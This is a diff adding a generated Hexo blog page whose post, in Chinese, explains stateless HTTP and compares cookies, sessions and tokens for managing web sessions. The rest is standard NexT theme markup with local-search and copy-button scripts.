+                2023-05-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>无状态的HTTP协议</strong><br>很久很久之前， Web基本都是文档的浏览而已。既然是浏览， 作为服务器， 不需要记录在某一段时间里都浏览了什么文档， 每次请求都是一个新的HTTP协议，就是请求加响应。不用记录谁刚刚发了HTTP请求， 每次请求都是全新的。</p>
+<p><strong>如何管理会话</strong><br>随着交互式Web应用的兴起， 像在线购物网站，需要登录的网站等，马上面临一个问题，就是要管理回话，记住那些人登录过系统，哪些人往自己的购物车中放商品，也就是说我必须把每个人区分开。</p>
+<p><strong>cookie</strong><br>cookie 是一个非常具体的东西，指的就是浏览器里面能永久存储的一种数据。cookie由服务器生成，发送给浏览器，浏览器把cookie以KV形式存储到某个目录下的文本文件中，下一次请求同一网站时会把该cookie发送给服务器。由于cookie是存在客户端上的，所以浏览器加入了一些限制确保cookie不会被恶意使用</p>
+<p><strong>session</strong><br>服务器要知道当前请求发给自己的是谁。为了做这种区分，服务器就是要给每个客户端分配不同的”身份标识”，然后客户端每次向服务器发请求的时候，都带上这个”身份标识“，服务器就知道这个请求来自与谁了。</p>
+<p><strong>Token</strong></p>
+<blockquote>
+<p>1、用户通过用户名和密码发送请求<br>2、程序验证<br>3、程序返回一个签名的token给客户端<br>4、客户端储存token, 并且每次用每次发送请求<br>5、服务端验证Token并返回数据</p>
+</blockquote>
+<p><strong>Cookie和Session的区别</strong></p>
+<blockquote>
+<p>1、存储位置不同： ookie数据存放在客户的浏览器上，session数据放在服务器上<br>2、隐私策略不同：cookie不是很安全， 别人可以分析存放在本地的cookie并进行cookie欺骗，考虑到安全应当使用session<br>3、session会在一定时间内保存在服务器上。当访问增多，就会比较占用你服务器的性能，考虑到减轻服务器性能方面，应当使用cookie<br>4、存储大小不同： 单个cookie保存的数据不能超过4k, 很多浏览器都限制一个站点最多保存20个cookie<br>一般建议： 将登陆信息等重要信息存放为session, 其他信息如果需要保留，可以放在cookie中</p>
+</blockquote>
+<p><strong>Token和Session的区别</strong><br>Session是一种HTTP储存机制， 为无状态的HTTP提供持久机制;<br>Token就是令牌， 比如你授权(登录)一个程序时，它就是个依据，判断你是否已经授权该软件；<br>Session和Token并不矛盾，作为身份认证Token安全性比Session好，因为每一个请求都有签名还能防止监听以及重放攻击，而Session就必须依赖链路层来保障通讯安全了。如上所说，如果你需要实现有状态的回话，仍然可以增加Session来在服务端保存一些状态。</p>
+<p><strong>总结</strong><br>cookie，session，Token没有绝对的好与坏之分，只要还是要结合实际的业务场景和需求来决定采用哪种方式来管理回话，当然也可以三种都用。<br><img src="/./img/3.jpg"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
-  {% include '_partials/pagination.swig' %}
-{% endblock %}
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
+  </nav>
 
-{% block sidebar %}
-  {{ sidebar_template.render(false) }}
-{% endblock %}
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzklov</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #4D4D4C;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #F7F7F7;
+      background-image: linear-gradient(#F7F7F7, #F7F7F7);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('Copied')
+          else $(this).text('Copy failed')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('Copy')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+ 
+</body>
+</html>
